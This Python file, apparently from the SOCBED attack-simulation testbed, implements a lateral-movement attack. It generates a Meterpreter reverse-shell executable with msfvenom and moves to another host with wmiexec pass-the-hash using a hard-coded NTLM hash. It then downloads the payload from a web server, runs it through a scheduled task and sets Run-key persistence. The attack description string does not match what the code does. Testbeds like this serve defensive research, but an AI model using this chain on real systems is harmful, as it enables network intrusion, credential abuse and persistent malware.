# Copyright 2016-2024 1ncludeSteven
#
# This file is part of SOCBED.
#
# SOCBED is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# SOCBED is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with SOCBED. If not, see <http://www.gnu.org/licenses/>.


import time
import uuid

from attacks import AttackInfo
from attacks.c2_attack_options import C2AttackOptions, C2Attack


class C2LateralMovementAttackOptions(C2AttackOptions):
    rhost = "Target client host or IP address"
    lport2 = "Another client reverse HTTP target port"
    file = "Target file on the client"
    url = "URL of malware to download"
    data = "Data of the Registry Value of Autostart Command"
    name = "Name of the Registry Value of Autostart Command"

    def _set_defaults(self):
        self.rhost = "172.16.1.2"
        self.lport2 = "1443"
        self.file = "C:\\Windows\\meterpreter_bind_tcp.exe"
        self.url = "http://172.18.1.1/meterpreter_bind_tcp.exe"
        self.data = "meterpreter_bind_tcp.exe"
        self.name = "Meterpreter Bind TCP"


class C2LateralMovementAttack(C2Attack):
    info = AttackInfo(
        name="c2_lateral_movement",
        description="Finds and sends doc related files over the C&C channel")
    options_class = C2LateralMovementAttackOptions
    handler = None

    def run(self):
        with self.check_printed("The operation completed successfully"):
            self.exec_command_on_target(self._generate_exe_command())
            self.ssh_client.connect_to_target()
            with self.wrap_ssh_exceptions():
                self.exec_commands_on_shell(self.commands)
                time.sleep(1)
                self.ssh_client.close()

    def _append_command(self):
        self.commands.extend([
            "shell",
            "pip install impacket -i https://pypi.tuna.tsinghua.edu.cn/simple",
            f"wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2aca7635afdc3febc408bee6b89acf16 breach@{self.options.rhost}",
            f"powershell -Command \"Invoke-WebRequest -Uri '{self.options.url}' -OutFile '{self.options.file}'\"",
            self._execute_malware_command(),
            self._autostart_command(),
            'exit()',
            'exit()',
            "exit -y"
        ])

    def _execute_malware_command(self):
        file = self.options.file
        random_tag = "tag_" + str(uuid.uuid4())[0:5]
        client_name = "client" + self.options.rhost[-1:]
        return (f"schtasks /create /sc once /st 23:59 /tn {random_tag} /tr \"{file}\" /ru BREACH\\{client_name} && "
         f"schtasks /run /tn {random_tag}")

    def _autostart_command(self):
        name = self.options.name
        data = self.options.data
        return (
            "REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            f"/v \"{name}\" /t REG_SZ /d \"{data}\" /f")

    def _generate_exe_command(self):
        lhost = self.options.lhost
        lport = self.options.lport2
        meterpreter_script = ("msfvenom -p windows/x64/meterpreter/reverse_tcp "
                              f"LHOST={lhost} LPORT={lport} -a x64 StagerRetryCount=604800 "
                              "-f exe-only -o /var/www/vhost.com/meterpreter_bind_tcp.exe")
        return meterpreter_script
